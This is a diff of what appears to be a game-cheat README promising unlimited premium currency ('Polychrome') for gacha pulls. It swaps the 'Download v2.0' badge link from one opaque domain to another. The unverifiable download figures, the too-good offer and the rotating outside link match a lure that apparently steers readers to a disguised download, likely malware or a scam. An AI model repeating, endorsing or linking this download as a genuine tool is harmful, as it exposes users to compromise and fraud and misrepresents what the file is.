@@ -70,7 +70,7 @@ A: Yes — unlimited Polychrome for Signal Search pulls.
 
 **Monthly downloads:** 2.3m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/zzztr19)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/zzztr19)
 
 ---
 
